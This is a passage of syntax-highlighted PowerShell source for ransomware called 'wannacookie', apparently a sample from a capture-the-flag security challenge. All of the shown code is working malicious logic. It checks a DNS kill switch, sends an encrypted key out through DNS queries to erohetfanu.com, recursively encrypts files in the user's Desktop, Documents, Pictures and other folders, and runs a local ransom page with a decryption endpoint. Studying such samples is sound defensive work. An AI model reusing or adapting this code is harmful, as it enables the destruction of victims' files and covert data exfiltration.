    &lt;span class="nv"&gt;$chunks&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s_2_c&lt;/span&gt; &lt;span class="nv"&gt;$enc_k&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$j&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nv"&gt;$chunks&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$chunks&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IndexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$n_c_id&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$j.6B6579666F72626F746964.erohetfanu.com&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Strings&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Strings&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$n_c_id&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;wanc&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$S1&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$null&lt;/span&gt; &lt;span class="o"&gt;-ne&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2A&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;ti_rox&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;G2B&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2B&lt;/span&gt; &lt;span class="nv"&gt;$S1&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="n"&gt;6B696C6C737769746368&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Strings&lt;/span&gt;&lt;span class="p"&gt;))).&lt;/span&gt;&lt;span class="n"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="n"&gt;-ErrorAction&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;($(&lt;/span&gt;&lt;span class="n"&gt;netstat&lt;/span&gt; &lt;span class="n"&gt;-ano&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Select-String&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;127.0.0.1:8080&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;-ne&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt; &lt;span class="o"&gt;-or&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Get-WmiObject&lt;/span&gt; &lt;span class="n"&gt;Win32_ComputerSystem&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;Domain&lt;/span&gt; &lt;span class="o"&gt;-ne&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;KRINGLECASTLE&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="nv"&gt;$p_k&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="no"&gt;[System.Convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;($(&lt;/span&gt;&lt;span class="n"&gt;g_o_dns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;7365727665722E637274&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$b_k&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[System.Text.Encoding]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Unicode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;($((&lt;/span&gt;&lt;span class="no"&gt;[char[]]&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[char]01..[char]&lt;/span&gt;&lt;span class="n"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[char[]]&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[char]01..[char]&lt;/span&gt;&lt;span class="n"&gt;255&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;9&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;sort&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                        &lt;span class="nb"&gt;Get-Random&lt;/span&gt;
                        &lt;span class="p"&gt;})[&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;15&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;-join&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$_&lt;/span&gt; &lt;span class="o"&gt;-ne&lt;/span&gt; &lt;span class="n"&gt;0x00&lt;/span&gt;
            &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="nv"&gt;$h_k&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="nv"&gt;$b_k&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$k_h&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;sh1&lt;/span&gt; &lt;span class="nv"&gt;$h_k&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$p_k_e_k&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p_k_e&lt;/span&gt; &lt;span class="nv"&gt;$b_k&lt;/span&gt; &lt;span class="nv"&gt;$p_k&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="nv"&gt;$c_id&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;snd_k&lt;/span&gt; &lt;span class="nv"&gt;$p_k_e_k&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$d_t&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(($(&lt;/span&gt;&lt;span class="nb"&gt;Get-Date&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;ToUniversalTime&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Out-String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-replace&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;`r`n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="no"&gt;[array]&lt;/span&gt;&lt;span class="nv"&gt;$f_c&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;Get-ChildItem&lt;/span&gt; &lt;span class="p"&gt;*.&lt;/span&gt;&lt;span class="n"&gt;elfdb&lt;/span&gt; &lt;span class="n"&gt;-Exclude&lt;/span&gt; &lt;span class="p"&gt;*.&lt;/span&gt;&lt;span class="n"&gt;wannacookie&lt;/span&gt; &lt;span class="n"&gt;-Path&lt;/span&gt; &lt;span class="p"&gt;$($(&lt;/span&gt;&lt;span class="nv"&gt;$env:userprofile&lt;/span&gt;&lt;span class="p"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\Desktop&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),$(&lt;/span&gt;&lt;span class="nv"&gt;$env:userprofile&lt;/span&gt;&lt;span class="p"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\Documents&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),$(&lt;/span&gt;&lt;span class="nv"&gt;$env:userprofile&lt;/span&gt;&lt;span class="p"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\Videos&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),$(&lt;/span&gt;&lt;span class="nv"&gt;$env:userprofile&lt;/span&gt;&lt;span class="p"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\Pictures&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),$(&lt;/span&gt;&lt;span class="nv"&gt;$env:userprofile&lt;/span&gt;&lt;span class="p"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\Music&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="n"&gt;-Recurse&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="p"&gt;!&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PSIsContainer&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;Foreach&lt;/span&gt;&lt;span class="n"&gt;-Object&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fullname&lt;/span&gt;
            &lt;span class="p"&gt;});&lt;/span&gt;
    &lt;span class="n"&gt;e_n_d&lt;/span&gt; &lt;span class="nv"&gt;$b_k&lt;/span&gt; &lt;span class="nv"&gt;$f_c&lt;/span&gt; &lt;span class="nv"&gt;$true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nb"&gt;Clear-variable&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;h_k&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nb"&gt;Clear-variable&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;b_k&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$lurl&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://127.0.0.1:8080/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$html_c&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;@{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;GET /&amp;#39;&lt;/span&gt;  &lt;span class="p"&gt;=&lt;/span&gt;  &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;g_o_dns&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A2H&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;source.min.html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;GET /close&amp;#39;&lt;/span&gt;  &lt;span class="p"&gt;=&lt;/span&gt;  &lt;span class="s1"&gt;&amp;#39;&amp;lt;p&amp;gt;Bye!&amp;lt;/p&amp;gt;&amp;#39;&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="nb"&gt;Start-Job&lt;/span&gt; &lt;span class="n"&gt;-ScriptBlock&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$url&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nb"&gt;Start-Sleep&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nb"&gt;Add-type&lt;/span&gt; &lt;span class="n"&gt;-AssemblyName&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Forms&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nb"&gt;start-process&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$url&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-WindowStyle&lt;/span&gt; &lt;span class="n"&gt;Maximized&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nb"&gt;Start-sleep&lt;/span&gt; &lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="no"&gt;[System.Windows.Forms.SendKeys]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;SendWait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;{F11}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;-Arg&lt;/span&gt; &lt;span class="nv"&gt;$lurl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$list&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Net&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpListener&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Prefixes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$lurl&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$close&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsListening&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$context&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$list&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="nv"&gt;$Req&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$Resp&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$recvd&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{0} {1}&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;-f&lt;/span&gt; &lt;span class="nv"&gt;$Req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;httpmethod&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$Req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;localpath&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$recvd&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GET /&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nv"&gt;$html&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$html_c&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$recvd&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;elseif&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$recvd&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GET /decrypt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nv"&gt;$akey&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$Req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryString&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;key&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$k_h&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;sh1&lt;/span&gt; &lt;span class="nv"&gt;$akey&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nv"&gt;$akey&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2B&lt;/span&gt; &lt;span class="nv"&gt;$akey&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                    &lt;span class="no"&gt;[array]&lt;/span&gt;&lt;span class="nv"&gt;$f_c&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;Get-ChildItem&lt;/span&gt; &lt;span class="n"&gt;-Path&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="nv"&gt;$env:userprofile&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;-Recurse&lt;/span&gt;  &lt;span class="n"&gt;-Filter&lt;/span&gt; &lt;span class="p"&gt;*.&lt;/span&gt;&lt;span class="n"&gt;wannacookie&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                            &lt;span class="p"&gt;!&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PSIsContainer&lt;/span&gt;
                            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;Foreach&lt;/span&gt;&lt;span class="n"&gt;-Object&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                            &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fullname&lt;/span&gt;
                            &lt;span class="p"&gt;});&lt;/span&gt;
                    &lt;span class="n"&gt;e_n_d&lt;/span&gt; &lt;span class="nv"&gt;$akey&lt;/span&gt; &lt;span class="nv"&gt;$f_c&lt;/span&gt; &lt;span class="nv"&gt;$false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                    &lt;span class="nv"&gt;$html&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Files have been decrypted!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                    &lt;span class="nv"&gt;$close&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$true&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nv"&gt;$html&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Invalid Key!&amp;quot;&lt;/span&gt;
                &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;elseif&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$recvd&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GET /close&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nv"&gt;$close&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="nv"&gt;$html&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$html_c&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$recvd&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;elseif&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$recvd&lt;/span&gt; &lt;span class="o"&gt;-eq&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GET /cookie_is_paid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
